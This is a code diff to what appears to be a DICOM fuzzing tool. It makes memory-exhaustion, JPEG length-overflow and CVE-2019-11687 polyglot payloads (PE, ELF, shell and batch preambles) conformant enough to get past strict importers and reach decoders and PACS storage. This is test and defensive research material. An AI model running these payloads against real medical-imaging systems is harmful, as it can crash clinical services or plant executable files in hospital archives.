@@ -1121,17 +1121,26 @@ class MemoryAttacks:
     def fragment_count_bomb() -> AttackResult:
         """Encapsulated pixel data with huge number of fragments."""
         pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
-        
+
         for i in range(10000):
             pixel.add_fragment(b'\xFF\xD8\xFF\xE0')
-        
+
+        # encode_element(), not encode(): the fragments have to be carried by a
+        # (7FE0,0010) element with undefined length or the payload is a bare
+        # item stream, which an SCP rejects as a malformed data set long before
+        # it counts a single fragment.
         return AttackResult(
             name='fragment_count_bomb',
             category='memory',
-            payload=pixel.encode(),
+            payload=pixel.encode_element(implicit_vr=True),
             description='10,000 pixel fragments',
             expected_behavior='May exhaust memory tracking fragments',
-            metadata={'bug_class': 'resource-exhaustion'}
+            metadata={
+                'bug_class': 'resource-exhaustion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+                'transfer_syntax': '1.2.840.10008.1.2.4.50',
+            },
         )
     
     @staticmethod
@@ -1273,14 +1282,23 @@ class MemoryAttacks:
         
         pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
         pixel.add_fragment(fake_jpeg)
-        
+
+        # The lie under test is the JPEG APP0 segment length, so the DICOM
+        # framing around it has to be valid: wrapped in (7FE0,0010) with
+        # undefined length, or the SCP stops at the data set and the JPEG
+        # decoder — the actual target — is never invoked.
         return AttackResult(
             name='encapsulated_frame_overflow',
             category='memory',
-            payload=pixel.encode(),
+            payload=pixel.encode_element(implicit_vr=True),
             description='JPEG with oversized segment length',
             expected_behavior='JPEG decoder should handle gracefully',
-            metadata={'bug_class': 'codec-length'}
+            metadata={
+                'bug_class': 'codec-length',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+                'transfer_syntax': '1.2.840.10008.1.2.4.50',
+            },
         )
 
     @classmethod
@@ -3644,7 +3662,8 @@ class CVEAttacks:
             payload=data,
             description='Sequence with undefined length but no items',
             expected_behavior='Parser may access freed sequence memory',
-            metadata={'cve': 'CVE-2023-32135'}
+            metadata={'cve': 'CVE-2023-32135',
+                      'bug_class': 'dangling-sequence-reference'}
         ))
         
         # Test 2: Invalid nested dataset pointers (beyond EOF)
@@ -3662,7 +3681,8 @@ class CVEAttacks:
             payload=data,
             description='Sequence item with offset beyond EOF',
             expected_behavior='Parser should detect invalid offset',
-            metadata={'cve': 'CVE-2023-32135'}
+            metadata={'cve': 'CVE-2023-32135',
+                      'bug_class': 'oob-item-length'}
         ))
         
         # Test 3: Premature sequence termination (truncated file)
@@ -3681,7 +3701,8 @@ class CVEAttacks:
             payload=data,
             description='Sequence truncated without delimiters',
             expected_behavior='Parser may leave dangling references',
-            metadata={'cve': 'CVE-2023-32135'}
+            metadata={'cve': 'CVE-2023-32135',
+                      'bug_class': 'truncated-sequence'}
         ))
         
         return results
@@ -4110,10 +4131,42 @@ class CVEAttacks:
     # -------------------------------------------------------------------------
     
     @staticmethod
+    def _polyglot_part10(preamble: bytes) -> bytes:
+        """Wrap an executable ``preamble`` in a conformant Part-10 file.
+
+        The whole point of CVE-2019-11687 is a file that is *simultaneously*
+        valid in two formats: a loader sees the preamble, a PACS sees DICOM.
+        That only holds if the DICOM half is genuinely well formed — PS3.10
+        requires File Meta Information (group 0002) directly after ``DICM``,
+        and above all (0002,0010) Transfer Syntax UID, without which a reader
+        does not know how to decode the data set.
+
+        Emitting the preamble, ``DICM``, then jumping straight to a data set
+        element left the file non-conformant, so a strict importer rejects it
+        at the header and the interesting question — whether the PACS stores a
+        file its scanner also considers an executable — is never reached.
+        """
+        df = DicomFile()
+        df.preamble = preamble[:128].ljust(128, b'\x00')
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',  # Explicit VR LE
+        )
+        df.dataset = CVEAttacks._ds_bytes([
+            Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
+            Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
+            Element(0x0008, 0x0060, 'CS', 'OT'),
+            Element(0x0010, 0x0010, 'PN', 'Doe^John'),
+            Element(0x0010, 0x0020, 'LO', '12345'),
+        ])
+        return df.encode()
+
+    @staticmethod
     def cve_2019_11687_polyglot() -> List[AttackResult]:
         """
         CVE-2019-11687: Executable Embedding in DICOM Preamble
-        
+
         The 128-byte preamble can contain PE/ELF headers, making the file
         valid as both DICOM and executable.
         """
@@ -4126,10 +4179,7 @@ class CVEAttacks:
         dos_header += b'\x00' * (64 - len(dos_header))  # Pad DOS header to 64 bytes
         dos_header += b'\x00' * 64  # Rest of preamble
         
-        file_data = dos_header + b'DICM'
-        # Add minimal dataset
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(dos_header)
         
         results.append(AttackResult(
             name='cve_2019_11687_01_pe_header',
@@ -4147,9 +4197,7 @@ class CVEAttacks:
         elf_header += b'\x01'  # ELF version
         elf_header += b'\x00' * (128 - len(elf_header))  # Pad
         
-        file_data = elf_header + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(elf_header)
         
         results.append(AttackResult(
             name='cve_2019_11687_02_elf_header',
@@ -4164,9 +4212,7 @@ class CVEAttacks:
         script = b'#!/bin/sh\necho "pwned"\n#'
         script += b'\x00' * (128 - len(script))
         
-        file_data = script + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(script)
         
         results.append(AttackResult(
             name='cve_2019_11687_03_script_preamble',
@@ -4181,9 +4227,7 @@ class CVEAttacks:
         batch = b'@echo off\r\necho pwned\r\nREM '
         batch += b' ' * (128 - len(batch))
         
-        file_data = batch + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(batch)
         
         results.append(AttackResult(
             name='cve_2019_11687_04_batch_preamble',
@@ -4203,9 +4247,7 @@ class CVEAttacks:
         tiff += struct.pack('<I', 0)          # no next IFD
         tiff += b'\x00' * (128 - len(tiff))   # pad out the 128-byte preamble
 
-        file_data = tiff + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(tiff)
 
         results.append(AttackResult(
             name='cve_2019_11687_05_tiff_header',
